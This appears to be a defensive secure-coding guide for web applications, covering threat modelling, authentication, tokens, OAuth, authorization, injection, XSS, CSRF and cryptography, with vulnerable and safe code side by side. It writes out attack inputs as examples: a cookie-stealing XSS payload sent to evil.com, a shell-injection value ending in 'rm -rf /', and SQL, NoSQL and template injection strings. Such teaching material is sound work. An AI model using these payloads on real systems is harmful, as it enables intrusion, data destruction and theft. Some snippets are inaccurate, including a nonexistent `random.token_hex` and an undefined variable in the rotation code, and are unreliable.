# Security Engineering Guide — Deep Dive

Companion to Part 6 of `01_SOFTWARE_ENGINEERING_FIELD_GUIDE.md`.

This is a working reference for building secure software: how to think about threats, how to implement defences correctly, and how to verify them.

---

## Table of Contents

- [1. The security mindset](#1-the-security-mindset)
- [2. Threat modelling with STRIDE](#2-threat-modelling-with-stride)
- [3. Authentication](#3-authentication)
- [4. Session and token management](#4-session-and-token-management)
- [5. OAuth 2.0 and OpenID Connect](#5-oauth-20-and-openid-connect)
- [6. Authorization](#6-authorization)
- [7. Injection attacks](#7-injection-attacks)
- [8. Cross-site scripting](#8-cross-site-scripting)
- [9. Cross-site request forgery](#9-cross-site-request-forgery)
- [10. Cryptography](#10-cryptography)
- [11. Input validation and output encoding](#11-input-validation-and-output-encoding)
- [12. API security](#12-api-security)
- [13. Secrets management](#13-secrets-management)
- [14. Dependency and supply chain security](#14-dependency-and-supply-chain-security)
- [15. File uploads and path traversal](#15-file-uploads-and-path-traversal)
- [16. Server-Side Request Forgery](#16-server-side-request-forgery)
- [17. Deserialization](#17-deserialization)
- [18. Security headers and browser defences](#18-security-headers-and-browser-defences)
- [19. Rate limiting and brute force](#19-rate-limiting-and-brute-force)
- [20. Database security](#20-database-security)
- [21. Logging, auditing, and incident response](#21-logging-auditing-and-incident-response)
- [22. Security testing](#22-security-testing)
- [23. Privacy and compliance](#23-privacy-and-compliance)
- [24. Secure development workflow](#24-secure-development-workflow)
- [25. Learning resources](#25-learning-resources)

---

# 1. The security mindset

## 1.1 The two rules

> **Rule 1: Trust nothing. Verify everything.**
>
> **Rule 2: Every input is hostile until proven otherwise — and that includes input from your own frontend.**

## 1.2 The assume-breach model

Do not ask "how do I keep attackers out?" Ask **"assume they are already in — what limits the damage?"**

| Defensive thinking | Attacker thinking |
|---|---|
| "I'll add a login page." | "I'll register an account normally." |
| "The button is hidden." | "I'll type the URL directly." |
| "Only my frontend calls the API." | "I'll call it with curl." |
| "Users won't try that." | "They will, and it's the first thing anyone tries." |

## 1.3 Authentication vs authorization vs validation

| Concept | Question | If you get it wrong |
|---|---|---|
| **Authentication** | Who are you? | Impersonation |
| **Authorization** | What may you do? | Privilege escalation, data breach |
| **Validation** | Is this input well-formed? | Injection, crashes, corruption |
| **Sanitisation** | Remove dangerous content | XSS |
| **Encoding** | Escape for the output context | XSS |
| **Error handling** | Don't leak internals | Information disclosure |

## 1.4 The CIA triad and beyond

| Property | Meaning | Failure looks like |
|---|---|---|
| **Confidentiality** | Only authorised parties read it | Data breach |
| **Integrity** | Nobody can alter it undetected | Tampering, fraud |
| **Availability** | It works when needed | DoS, ransomware |
| **Authentication** | Proving identity | Account takeover |
| **Non-repudiation** | Actions cannot be denied | Unprovable disputes |
| **Accountability** | Actions are traceable | Undetectable abuse |

## 1.5 Cost of a breach by phase

| Phase | Remediation cost |
|---|---|
| Requirements / design | 1× |
| Implementation | 5× |
| Testing | 10× |
| Production | 30–100× |

This is why security in the design phase is not optional politeness — it is arithmetic.

---

# 2. Threat modelling with STRIDE

## 2.1 The process

```
1. Draw the data flow diagram
        ↓
2. Identify trust boundaries (where privilege or data changes)
        ↓
3. For each element crossing a boundary, walk STRIDE
        ↓
4. Rank findings by impact × likelihood
        ↓
5. Design controls
        ↓
6. Document — including what you decided NOT to fix
```

**The last step is the one people skip, and it is the one that matters.** An unrecorded accepted risk becomes an unowned vulnerability.

## 2.2 The six questions

| Letter | Question | Typical control |
|---|---|---|
| **S**poofing | Can someone claim to be another user? | Authentication, MFA, signed tokens |
| **T**ampering | Can data be modified in transit or at rest? | TLS, HMAC, signatures, integrity checks |
| **R**epudiation | Can someone deny having done it? | Immutable audit logs, timestamps |
| **I**nformation disclosure | Can data leak? | Authorisation, encryption, minimal error messages |
| **D**enial of service | Can it be made unavailable? | Rate limits, timeouts, resource quotas |
| **E**levation of privilege | Can someone gain more rights? | RBAC, input validation, least privilege |

## 2.3 A worked threat model

**System:** URL shortener. Anonymous users create short links; logged-in users can view their analytics.

| # | Element | Threat | Control | Priority |
|---|---|---|---|---|
| 1 | Client → Server | **S**: forged user identity | JWT signature verification on every request | Critical |
| 2 | Server → DB | **T**: modified link ownership | Ownership enforced in the SQL query, not in application code | Critical |
| 3 | `GET /links/{code}` | **I**: enumerate private links | Random ≥8-char codes; rate limit enumeration | High |
| 4 | Analytics endpoint | **E**: read another user's stats | `WHERE user_id = :current_user`, never `:param` | Critical |
| 5 | Redirect endpoint | **T**: open redirect | Allow-list of permitted destination domains | High |
| 6 | Create endpoint | **D**: mass link creation | Rate limit per IP and per user | Medium |
| 7 | All endpoints | **I**: stack trace leak | Global exception handler, generic message ID | High |
| 8 | Admin actions | **R**: deny having banned someone | Append-only audit log | Medium |
| 9 | Redirect endpoint | **T**: `javascript:` URL in Location | Scheme allow-list (`http`/`https` only) | Critical |

**Accepted risks (documented, not fixed):** no bot protection — mitigated by rate limits; no 2FA — deferred until user data becomes sensitive.

## 2.4 Trust boundaries

Draw these explicitly. They are where controls belong.

```
┌── UNTRUSTED ─────────────────┐
│  Browser / mobile app        │   ← attacker-controlled
└──────────────┬───────────────┘
               │ ← TLS termination, input validation
┌──────────────▼───────────────┐
│  EDGE / WAF / load balancer  │
└──────────────┬───────────────┘
               │ ← authentication
┌──────────────▼───────────────┐
│  API TIER                    │   ← authorisation, business logic
└──────────────┬───────────────┘
               │ ← least-privilege DB user, parameterised queries
┌──────────────▼───────────────┐
│  DATA TIER                   │   ← encryption at rest, backups
└──────────────────────────────┘

┌── UNTRUSTED ─────────────────┐
│  Third-party APIs            │   ← validate everything they return
└──────────────────────────────┘
```

---

# 3. Authentication

## 3.1 Password storage

```python
import argon2
import secrets

_hasher = argon2.PasswordHasher(
    time_cost=3,        # memory-hard; tune up as hardware improves
    memory_cost=65536,  # 64 MB per hash — makes GPU cracking expensive
    parallelism=4,
)


def hash_password(plaintext: str) -> str:
    """Argon2id embeds its own salt and parameters in the output."""
    return _hasher.hash(plaintext)


def verify_password(stored_hash: str, plaintext: str) -> bool:
    try:
        return _hasher.verify(stored_hash, plaintext)
    except argon2.exceptions.VerifyMismatchError:
        return False
    except argon2.exceptions.InvalidHashError:
        return False          # corrupt row — fail closed, never open
```

**Why not `bcrypt` or `bcrypt`'s predecessor `SHA-256`?**

| Method | Verdict |
|---|---|
| Plaintext | Catastrophic. One database dump leaks every account, including reused passwords on other sites |
| MD5 | Broken. Fast enough to brute-force trivially |
| SHA-1 | Broken for collisions |
| SHA-256 + salt | Better than nothing but **still too fast** — GPUs do billions per second. Salt stops rainbow tables, not brute force |
| `bcrypt` | Acceptable. Memory-hard, built-in salt, widely supported |
| **Argon2id** | **Current recommendation.** Winner of the Password Hashing Competition; memory-hard; resists GPU and side-channel attacks |

## 3.2 Password policy that is actually evidence-based

NIST guidance, contrary to most older advice:

```python
import re
import secrets

MIN_LENGTH = 12
MAX_LENGTH = 128        # bcrypt truncates at 72 bytes — reject longer to avoid silent truncation


def validate_password(password: str, username: str = "") -> list[str]:
    """Return a list of problems. Empty list means acceptable."""
    problems: list[str] = []

    if len(password) < MIN_LENGTH:
        problems.append(f"Password must be at least {MIN_LENGTH} characters")

    if len(password.encode("utf-8")) > MAX_LENGTH:
        problems.append(f"Password must be at most {MAX_LENGTH} bytes")

    if username and username.lower() in password.lower():
        problems.append("Password must not contain your username")

    if len(set(password)) < 5:
        problems.append("Password needs more variety")

    return problems
```

| Rule | Guidance |
|---|---|
| Length | 12+ characters. Length beats complexity |
| Complexity symbols | **Not required.** `Passw0rd!` is weaker than `correct horse battery staple`| 
| Rotation | **Do not force periodic rotation.** It drives users to `Password1!` |
| Hint questions | Effectively public knowledge. Do not use |
| Blocklist | Reject the most common breached passwords regardless of composition |
| Storage | Argon2id. Never log passwords, never email them |
| Reset | Single-use, random, expiring token. Never auto-generate a new password and email it |

## 3.3 Multi-factor authentication

Three factor categories:

| Factor | Type | Strength |
|---|---|---|
| Something you **know** | Password, PIN | Weakest |
| Something you **have** | Phone, hardware key | Strong |
| Something you **are** | Fingerprint, face | Strong, but revocable |

**TOTP** (authenticator app) and **WebAuthn/FIDO2** (hardware security keys) are the two strong options. SMS is the weakest — SIM swapping is trivial and SMS is unencrypted end-to-end.

**Always offer at least one non-SMS method.**

## 3.4 Account enumeration

```python
# ✗ WRONG — leaks whether an account exists
if not user:
    raise HTTPException(400, "No account with that email")


# ✓ RIGHT — one message for every failure mode
if not user or not verify_password(user.password_hash, password):
    # log the real reason internally, return one generic message externally
    logger.info("failed login for %s: %s", email, "no_user" if not user else "bad_password")
    raise HTTPException(401, "Incorrect email or password")
```

## 3.5 Timing attacks

```python
# ✗ WRONG — returns early, leaking length and content via timing
def check(secret: str, provided: str) -> bool:
    return secret == provided


# ✓ RIGHT — constant-time comparison
import hmac

def check(secret: str, provided: str) -> bool:
    return hmac.compare_digest(secret, provided)
```

`hmac.compare_digest` does not short-circuit, so the response time does not reveal where the mismatch occurred. This matters most for MAC and signature verification.

---

# 4. Session and token management

## 4.1 Server-side sessions vs JWT

| | Server-side session | JWT |
|---|---|---|
| State | Stored on the server | In the token (self-contained) |
| Revocation | Immediate (delete the row) | Difficult — must wait for expiry or use a blocklist |
| Lookup | One DB/cache query per request | None — verify the signature |
| Size | Small cookie | Large header |
| Best for | Traditional web apps | Distributed APIs, mobile clients |

**The JWT revocation problem is the main reason many production systems moved back to server-side sessions.** A stateless token cannot be withdrawn before it expires.

## 4.2 JWT implementation

```python
import os
import uuid
from datetime import datetime, timedelta, timezone

import jwt

ALGORITHM = "HS256"
ACCESS_TTL = timedelta(minutes=15)
REFRESH_TTL = timedelta(days=30)


def create_tokens(user_id: int, session_id: str | None = None) -> dict:
    now = datetime.now(timezone.utc)
    session_id = session_id or str(uuid.uuid4())      # enables per-session revocation

    access = jwt.encode(
        {
            "sub": str(user_id),
            "sid": session_id,
            "type": "access",
            "iat": now,
            "exp": now + ACCESS_TTL,
        },
        os.environ["JWT_SECRET"],
        algorithm=ALGORITHM,
    )

    refresh = jwt.encode(
        {
            "sub": str(user_id),
            "sid": session_id,
            "type": "refresh",
            "iat": now,
            "exp": now + REFRESH_TTL,
        },
        os.environ["JWT_REFRESH_SECRET"],
        algorithm=ALGORITHM,
    )

    return {"access_token": access, "refresh_token": refresh, "session_id": session_id}
```

### The critical claim-validation rules

```python
def decode_access_token(token: str, revoked_sessions: set[str] | None = None) -> int:
    """
    Validate fully. Returns the user id.
    Raises on any failure — never returns partial trust.
    """
    try:
        payload = jwt.decode(
            token,
            os.environ["JWT_SECRET"],
            algorithms=[ALGORITHM],       # NEVER read the algorithm from the token
            audience="myapp",
            issuer="myapp",
            options={
                "require": ["exp", "iat", "sub", "type"],   # fail if any missing
            },
        )
    except jwt.ExpiredSignatureError:
        raise HTTPException(401, "Token expired")
    except jwt.InvalidTokenError:
        raise HTTPException(401, "Invalid token")

    if payload["type"] != "access":
        raise HTTPException(401, "Wrong token type")        # block refresh-as-access

    if revoked_sessions and payload.get("sid") in revoked_sessions:
        raise HTTPException(401, "Session revoked")

    return int(payload["sub"])
```

### The `alg: none` attack

An attacker takes your JWT, sets `alg` to `none`, strips the signature, and sends it. If your server trusts the algorithm named in the token, it accepts it as valid.

```python
# ✗ VULNERABLE
payload = jwt.decode(token, key, algorithms=jwt.get_unverified_header(token)["alg"])

# ✓ SAFE — the allowed algorithm is hardcoded, never taken from the token
payload = jwt.decode(token, key, algorithms=["HS256"])
```

## 4.3 Refresh token rotation

```python
def rotate_refresh_token(token: str, used_tokens: set[str]) -> dict:
    """
    Each refresh token is single-use. Reuse of a consumed token means theft
    — revoke the entire session.
    """
    try:
        payload = jwt.decode(
            token,
            os.environ["JWT_REFRESH_SECRET"],
            algorithms=[ALGORITHM],
            audience="myapp",
            issuer="myapp",
        )
    except jwt.InvalidTokenError:
        raise HTTPException(401, "Invalid refresh token")

    if payload["type"] != "refresh":
        raise HTTPException(401, "Wrong token type")

    fingerprint = hash_token(token)
    if fingerprint in used_tokens:
        # A consumed token came back → someone stole it. Burn the session.
        revoked_sessions.add(payload["sid"])
        raise HTTPException(401, "Refresh token reuse detected; session revoked")

    used_tokens.add(fingerprint)
    return create_tokens(int(payload["sub"]), session_id=payload["sid"])


def hash_token(token: str) -> str:
    """Store a hash of the token, never the token itself."""
    import hashlib
    return hashlib.sha256(token.encode()).hexdigest()
```

## 4.4 Cookie configuration

```python
from fastapi import Response

def set_auth_cookies(response: Response, access: str, refresh: str) -> None:
    response.set_cookie(
        "access_token", access,
        httponly=True,      # JavaScript cannot read it → limits XSS impact
        secure=True,        # HTTPS only → never sent over plain HTTP
        samesite="strict",  # not sent cross-site → blocks CSRF
        max_age=900,
        path="/",
    )
    # Refresh cookie should be even more restricted
    response.set_cookie(
        "refresh_token", refresh,
        httponly=True,
        secure=True,
        samesite="strict",
        max_age=2_592_000,
        path="/api/auth/refresh",   # only sent to the refresh endpoint
    )
```

---

# 5. OAuth 2.0 and OpenID Connect

## 5.1 What the flows are for

**OAuth 2.0 = "let my app act on your behalf in a third-party service."**
**OpenID Connect = "let my app verify who you are at a third-party service."**

They are often bundled ("Sign in with Google") but solve different problems. OIDC adds an ID token.

## 5.2 Authorization code flow with PKCE

The only flow you should implement for a web/mobile app. Do not implement implicit or resource owner password flows — both are deprecated and unsafe.

```
User                    Your App                Auth Server (Google)
  |                         |                            |
  |--- "Sign in with G" ---->|                            |
  |<-- redirect + state -----|                            |
  |                                                        |
  |---------------------------------------------- /authorize?code=...&state=...
  |<-----------------------------------------------|
  |                         |                            |
  |--- code + verifier ---->|                            |
  |                         |--- code + verifier ------>|  (auth code + PKCE)
  |                         |<--- tokens --------------|
  |                         |                            |
  |<-- session -------------|                            |
```

### PKCE — the essential protection

The attacker can register their own client and intercept the authorization code. PKCE makes the code useless without the verifier, which only your server holds.

```python
import base64
import hashlib
import os
import secrets

def generate_pkce_pair() -> tuple[str, str]:
    """
    Returns (code_verifier, code_challenge).
    S256: challenge = BASE64URL(SHA256(verifier)) — never 'plain'.
    """
    verifier = base64.urlsafe_b64encode(os.urandom(64)).decode().rstrip("=")
    digest = hashlib.sha256(verifier.encode()).digest()
    challenge = base64.urlsafe_b64encode(digest).decode().rstrip("=")
    return verifier, challenge


def build_authorize_url(client_id: str, redirect_uri: str, state: str,
                        challenge: str) -> str:
    from urllib.parse import urlencode

    params = {
        "client_id": client_id,
        "redirect_uri": redirect_uri,
        "response_type": "code",
        "scope": "openid email profile",
        "state": state,                    # CSRF protection on the callback
        "code_challenge": challenge,
        "code_challenge_method": "S256",
    }
    return f"https://accounts.google.com/o/oauth2/v2/auth?{urlencode(params)}"


def validate_state(expected: str, received: str) -> None:
    """Reject if they differ — someone forged the callback."""
    if not hmac.compare_digest(expected, received):
        raise HTTPException(400, "OAuth state mismatch")
```

### Validate `state`

`state` is a random value stored in the user's session before the redirect. If it does not match on return, the callback was not initiated by your app — a CSRF attack. **Skipping this check is one of the most common OAuth implementation bugs.**

## 5.3 Redirect URI validation

```python
# ✗ VULNERABLE — prefix match lets an attacker register evil.com
if redirect_uri.startswith("https://myapp.com"):
    ...

# ✓ SAFE — exact match against a registered allow-list
ALLOWED_REDIRECT_URIS = {
    "https://myapp.com/auth/callback",
    "com.myapp://auth/callback",
}

if redirect_uri not in ALLOWED_REDIRECT_URIS:
    raise HTTPException(400, "Unregistered redirect_uri")
```

## 5.4 Token storage decisions

| Storage | Risk |
|---|---|
| `localStorage` | Readable by any XSS. Vulnerable |
| `sessionStorage` | Same XSS risk, cleared per tab |
| **HttpOnly cookie** | **Best for web** — inaccessible to JS |
| Keystore / Keychain | **Best for mobile** — hardware-backed where available |

---

# 6. Authorization

## 6.1 The model choices

| Model | How | Use when |
|---|---|---|
| **RBAC** | Roles map to permissions (`admin`, `editor`, `viewer`) | Simple, well-understood, most products |
| **ABAC** | Rules from attributes (`if dept == user's dept and level > 3`) | Complex, needs fine-grained control |
| **ReBAC** | Relationships (`user has access to doc because they own its parent folder`) | Hierarchical resources like Google Drive |

**Start with RBAC.** Move to ABAC only when RBAC's role explosion becomes unmanageable.

## 6.2 RBAC implementation

```python
from enum import Enum


class Role(str, Enum):
    OWNER = "owner"
    EDITOR = "editor"
    VIEWER = "viewer"


PERMISSIONS: dict[Role, set[str]] = {
    Role.OWNER:  {"deck:read", "deck:write", "deck:delete", "deck:share", "member:manage"},
    Role.EDITOR: {"deck:read", "deck:write"},
    Role.VIEWER: {"deck:read"},
}


def user_can(user_role: Role, permission: str) -> bool:
    """Is this permission granted to this role?"""
    return permission in PERMISSIONS.get(user_role, set())
```

## 6.3 Object-level authorization — BOLA / IDOR

**This is the most common serious vulnerability in real applications.** OWASP ranks Broken Access Control #1 for this reason.

The pattern: check that the caller owns the specific object, not merely that they are logged in.

```python
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session

router = APIRouter()


@router.get("/decks/{deck_id}")
def get_deck(deck_id: int, session: Session = Depends(get_db),
             current_user: User = Depends(get_current_user)):
    deck = session.execute(
        select(Deck).where(Deck.id == deck_id, Deck.owner_id == current_user.id)
    ).scalar_one_or_none()

    if deck is None:
        # 403 rather than 404 leaks less: an attacker learns nothing about existence
        raise HTTPException(403, "Not permitted")

    return deck
```

### The correct pattern

```
✗  Deck exists? → return it
   └── Attacker enumerates IDs and reads everyone's data

✓  Deck exists AND owner_id == current_user.id? → return it
   └── Ownership is part of the data access, not a check someone can forget
```

**Design principle:** enforce authorization inside the data-access function so it is impossible to call it without the check.

```python
class DeckRepository:
    def __init__(self, session: Session):
        self._session = session

    def get_for_user(self, deck_id: int, user_id: int) -> Deck | None:
        """Ownership is baked in. There is no way to fetch a deck without it."""
        return self._session.execute(
            select(Deck).where(Deck.id == deck_id, Deck.owner_id == user_id)
        ).scalar_one_or_none()
```

## 6.4 The permissions checklist

Before shipping any endpoint, answer:

1. Does this require authentication?
2. Which roles may call it?
3. Does it operate on a specific object? Who owns that object?
4. Can the client supply the owner id or role? (**No** — take it from the token)
5. What happens on a wrong-but-plausible id? Same response as a nonexistent one?
6. Is it a state-changing action? Should it require re-authentication?

## 6.5 Mass assignment

The most common hand-rolled API bug.

```python
# ✗ VULNERABLE
class UserUpdate(BaseModel):
    name: str
    email: str
    role: str = "user"
    is_admin: bool = False


@router.patch("/users/me")
def update_me(data: UserUpdate, user = Depends(get_current_user)):
    for field, value in data.model_dump().items():
        setattr(user, field, value)      # PATCH {"role":"admin","is_admin":true} → root
    session.commit()


# ✓ SAFE — only fields that exist on the schema can be set
class UserUpdate(BaseModel):
    name: str | None = None
    email: EmailStr | None = None
    # no role, no is_admin → they cannot be set from input, ever
    model_config = ConfigDict(extra="forbid")   # reject unknown fields outright


@router.patch("/users/me")
def update_me(data: UserUpdate, user = Depends(get_current_user)):
    for field, value in data.model_dump(exclude_unset=True).items():
        setattr(user, field, value)
    session.commit()
```

---

# 7. Injection attacks

**Injection is consistently the most exploited class of vulnerability.** The defence is always the same principle: **do not let untrusted input be interpreted as code or structure.**

## 7.1 SQL injection

```python
# ✗ VULNERABLE — string concatenation
def find_user(email: str):
    return session.execute(text(
        f"SELECT * FROM users WHERE email = '{email}'"
    ))

# Input: ' OR '1'='1
# Query: SELECT * FROM users WHERE email = '' OR '1'='1'   → returns EVERYTHING


# ✓ SAFE — bound parameter. The driver escapes it; the DB never sees syntax.
def find_user(email: str):
    return session.execute(
        text("SELECT * FROM users WHERE email = :email"),
        {"email": email},
    )
```

**With SQLAlchemy's ORM the safe form is the default:**

```python
# ✓ SAFE by construction — the ORM always binds parameters
session.execute(select(User).where(User.email == email))
```

**Never use `text()` with an f-string.** If you must use `text()`, bind every value with `:name`.

### The identifier trap

You cannot bind a table or column name as a parameter. Whitelist instead.

```python
SORTABLE_COLUMNS = {"created_at", "title", "updated_at"}


def list_decks(sort: str = "created_at"):
    # ✗ VULNERABLE — sort is an identifier, cannot be parameterised
    # session.execute(text(f"SELECT * FROM decks ORDER BY {sort}"))

    # ✓ SAFE — allow-list, reject anything else
    if sort not in SORTABLE_COLUMNS:
        raise HTTPException(400, "Invalid sort field")
    column = getattr(Deck, sort)
    return session.execute(select(Deck).order_by(column))
```

## 7.2 Command injection

```python
import subprocess

# ✗ VULNERABLE
os.system(f"ping -c 4 {user_input}")
# user_input = "8.8.8.8; rm -rf /"

subprocess.run(f"ping -c 4 {user_input}", shell=True)


# ✓ SAFE — argument list, no shell involved
subprocess.run(["ping", "-c", "4", user_input], check=True, timeout=10)
```

With `shell=True`, the shell parses metacharacters. Without it, the arguments go straight to `execve` and cannot be interpreted.

```python
# If you genuinely need a shell, quote every argument
subprocess.run(f"ping -c 4 {shlex.quote(user_input)}", shell=True)   # still worse — avoid
```

## 7.3 LDAP, XPath, and NoSQL injection

Same principle, different dialect.

```python
# NoSQL injection — operators smuggled through JSON
# Input: {"password": {"$ne": ""}}   matches any user with a password

# ✗ VULNERABLE — passes the dict straight to the driver
user = users.find_one({"email": email, "password": password})

# ✓ SAFE — coerce and validate to the expected type
if not isinstance(password, str):
    raise HTTPException(422, "Invalid password format")
user = users.find_one({"email": email, "password": hash_password(password)})
```

## 7.4 Template injection

```python
from jinja2.sandbox import SandboxedEnvironment

# ✗ VULNERABLE — Jinja2 evaluates expressions
render_template_string(f"Hello {user_input}")     # {{ config }} leaks secrets

# ✓ SAFE — pass data as variables, never as template source
render_template("hello.html", name=user_input)

# If you must build templates dynamically, sandbox and never give it real objects
env = SandboxedEnvironment()
env.autoescape = True
```

---

# 8. Cross-site scripting

## 8.1 The three types

| Type | Mechanism | Example |
|---|---|---|
| **Reflected** | The payload comes back in the same response | Search results echo your query |
| **Stored** | The payload is saved and served to other users | A comment others view |
| **DOM-based** | The payload runs purely in client-side JS | `location.hash` written to the page |

## 8.2 The defence is context-dependent encoding

There is no single "escape function." The correct encoding depends on **where the data ends up**:

| Context | Encoding |
|---|---|
| HTML body text | HTML entity encode |
| HTML attribute value | HTML attribute encode + quote |
| URL parameter | URL percent-encode |
| JavaScript string | JavaScript encode, or better: use `textContent` |
| CSS value | CSS encode |
| SQL | Parameter binding (never encoding) |

**Using the wrong encoding for the context is still an XSS vulnerability.**

## 8.3 Server-side rendering safely

```python
from markupsafe import escape
from fastapi.responses import HTMLResponse

@app.get("/search", response_class=HTMLResponse)
def search(q: str):
    # ✓ SAFE — escape before interpolation
    return f"<h1>Results for {escape(q)}</h1>"

# ✗ VULNERABLE
# return f"<h1>Results for {q}</h1>"
# q = "<script>fetch('evil.com?c='+document.cookie)</script>"
```

```python
# Jinja2 autoescape — ON by default in Flask; must be enabled explicitly in FastAPI/Jinja2Templates
from fastapi.templating import Jinja2Templates

templates = Jinja2Templates(directory="templates")
templates.env.autoescape = True        # verify this — it is off by default in bare Jinja2
```

## 8.4 DOM-based XSS

```javascript
// ✗ VULNERABLE — innerHTML parses HTML from a URL fragment
const name = location.hash.slice(1);
document.getElementById('greeting').innerHTML = `Hello ${name}`;

// ✓ SAFE — textContent does not parse HTML
document.getElementById('greeting').textContent = `Hello ${name}`;
```

```javascript
// ✓ SAFE — sanitise when you genuinely need HTML
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(untrustedHtml);
```

## 8.5 Content Security Policy

CSP is the defence-in-depth layer: even if an XSS slips through, the policy can block the script from doing damage.

```python
CSP = (
    "default-src 'self'; "
    "script-src 'self'; "          # no inline scripts, no CDNs unless listed
    "style-src 'self' 'unsafe-inline'; "
    "img-src 'self' data:; "
    "connect-src 'self'; "
    "frame-ancestors 'none'; "     # blocks clickjacking
    "base-uri 'self'; "
    "form-action 'self'"
)

@app.middleware("http")
async def security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = CSP
    return response
```

## 8.6 The complete defence checklist

- [ ] Encode output for its specific context
- [ ] Use templating with autoescape on
- [ ] Never use `innerHTML` with untrusted data
- [ ] Set a Content-Security-Policy
- [ ] Set `HttpOnly` on session cookies (limits what XSS can steal)
- [ ] Sanitise any HTML you intentionally allow (`bleach`, DOMPurify)
- [ ] Never build JavaScript by string concatenation with user data

---

# 9. Cross-site request forgery

**The attack:** a page you visit makes your browser send an authenticated request to a site you are logged into. Your browser attaches the session cookie automatically; your app cannot tell the request came from another site.

**CSRF is entirely about cookies.** Token-based `Authorization` headers are not attached automatically, so they are inherently CSRF-immune.

## 9.1 The defences, layered

```python
from starlette.middleware.csrf import CSRFMiddleware

# 1. SameSite cookies — the primary defence, and largely sufficient
response.set_cookie("session", token, samesite="strict", httponly=True, secure=True)

# 2. CSRF token — defence in depth
app.add_middleware(CSRFMiddleware)
```

| `SameSite` | Behaviour |
|---|---|
| `Strict` | Never sent cross-site. **Strongest.** Breaks legitimate external-link flows (you get logged out) |
| `Lax` | Sent on top-level GET navigation only. Good default |
| `None` | Always sent. **Requires `Secure`.** Effectively CSRF-enabled |

## 9.2 Token-based CSRF protection

```python
import secrets

def issue_csrf_token(session) -> str:
    token = secrets.token_urlsafe(32)
    session["csrf_token"] = token
    return token


def verify_csrf_token(session, submitted: str) -> None:
    expected = session.get("csrf_token")
    if not expected or not hmac.compare_digest(expected, submitted):
        raise HTTPException(403, "CSRF token mismatch")
```

```html
<form method="post" action="/decks">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
  <button>Create deck</button>
</form>
```

## 9.3 Defence checklist

- [ ] `SameSite=Lax` or `Strict` on all session cookies
- [ ] `Secure` and `HttpOnly` on all session cookies
- [ ] CSRF token on all state-changing requests (belt and braces)
- [ ] Never use GET for state changes
- [ ] If using `SameSite=None`, you **must** have a CSRF token

---

# 10. Cryptography

## 10.1 Do not invent cryptography

Use established libraries. Rolling your own is how breaches happen.

| Need | Library | Notes |
|---|---|---|
| Random tokens | `secrets` | **Never** use `random` for security |
| Password hashing | `argon2-cffi` | Argon2id |
| Symmetric encryption | `cryptography` (Fernet/AES-GCM) | |
| Signatures / asymmetric | `cryptography` | Ed25519, RSA-PSS, ECDSA |
| TLS | `ssl`, `requests`, `httpx` | Never configure manually |
| Constant-time compare | `hmac.compare_digest` | |

## 10.2 Randomness

```python
import random
import secrets

# ✗ NEVER for tokens, passwords, salts, session ids, nonces
token = random.token_hex(32)          # Mersenne Twister — state recoverable from output

# ✓ Cryptographically secure
token = secrets.token_urlsafe(32)     # 256 bits of entropy
salt = secrets.token_hex(16)
nonce = secrets.token_bytes(16)
```

**This is not theoretical.** Given a few outputs from Python's `random`, you can reconstruct its internal state and predict every subsequent "random" value. There are published one-liners that do this.

## 10.3 Encryption at rest

```python
from cryptography.fernet import Fernet, InvalidToken

class FieldEncryptor:
    """
    Encrypt/decrypt individual sensitive fields.
    Key comes from a secret manager — never hardcoded, never in the database
    alongside the ciphertext.
    """

    def __init__(self, key: bytes | None = None):
        self._cipher = Fernet(key or _load_key_from_vault())

    def encrypt(self, plaintext: str) -> str:
        return self._cipher.encrypt(plaintext.encode()).decode()

    def decrypt(self, ciphertext: str) -> str:
        try:
            return self._cipher.decrypt(ciphertext.encode()).decode()
        except InvalidToken:
            raise ValueError("Decryption failed — wrong key or tampered data")


def _load_key_from_vault() -> bytes:
    import os
    key = os.environ.get("FIELD_ENCRYPTION_KEY")
    if not key:
        raise RuntimeError("FIELD_ENCRYPTION_KEY is not set")
    return key.encode()
```

## 10.4 Symmetric vs asymmetric

| | Symmetric | Asymmetric |
|---|---|---|
| Keys | One shared key | Public + private pair |
| Speed | Fast | Slow |
| Use | Bulk data encryption | Key exchange, signatures |
| Problem | Key distribution | Performance |
| Algorithms | AES-GCM, ChaCha20-Poly1305 | RSA-OAEP, Ed25519, ECDSA |

Real systems combine them: TLS uses asymmetric crypto to agree a symmetric key, then symmetric crypto for the actual traffic.

## 10.5 Cryptographic mistakes checklist

- [ ] Never use ECB mode (reveals patterns)
- [ ] Never reuse a nonce with the same key in AES-GCM — **catastrophic**
- [ ] Never use a fixed or predictable IV
- [ ] Never roll your own cipher, mode, or padding
- [ ] Never use `hashlib.md5()` or `sha1()` for security
- [ ] Always authenticate ciphertext (use an AEAD mode — GCM, ChaCha20-Poly1305)
- [ ] Compare MACs with `hmac.compare_digest`, never `==`
- [ ] Use a KDF (PBKDF2, scrypt, Argon2) when deriving keys from passwords

```python
# ✗ Nonce reuse breaks AES-GCM authentication entirely
def encrypt_again(data: bytes, key: bytes):
    nonce = b"\x00" * 12                     # NEVER
    ...

# ✓ Random nonce per encryption, stored alongside the ciphertext
def encrypt_safely(data: bytes, key: bytes) -> tuple[bytes, bytes]:
    nonce = secrets.token_bytes(12)          # 96 bits, unique per key
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce))
    encryptor = cipher.encryptor()
    ct = encryptor.update(data) + encryptor.finalize()
    return ct + encryptor.tag, nonce         # store both
```

---

# 11. Input validation and output encoding

## 11.1 Validate at the boundary, once

```python
from pydantic import BaseModel, Field, EmailStr, field_validator
import re


class CreateDeck(BaseModel):
    title: str = Field(min_length=1, max_length=120)
    colour: str = Field(pattern=r"^#[0-9a-fA-F]{6}$")

    @field_validator("title")
    @classmethod
    def no_control_characters(cls, value: str) -> str:
        cleaned = "".join(ch for ch in value if ch.isprintable())
        if cleaned != value:
            raise ValueError("Title contains control characters")
        return cleaned.strip()


class RegisterUser(BaseModel):
    email: EmailStr
    password: str = Field(min_length=12, max_length=128)
```

## 11.2 Allow-list beats deny-list

```python
# ✗ Deny-list — bypassed by every encoding trick you did not think of
DANGEROUS = ["drop", "delete", "truncate", ";", "--"]

# ✓ Allow-list — only what you explicitly permit
ALLOWED_SORT_FIELDS = {"title", "created_at", "updated_at"}
ALLOWED_UPLOAD_TYPES = {"image/png", "image/jpeg", "application/pdf"}
ALLOWED_REDIRECT_SCHEMES = {"https", "http"}
```

## 11.3 Validation checklist

- [ ] Type: is it the right type, not just parseable?
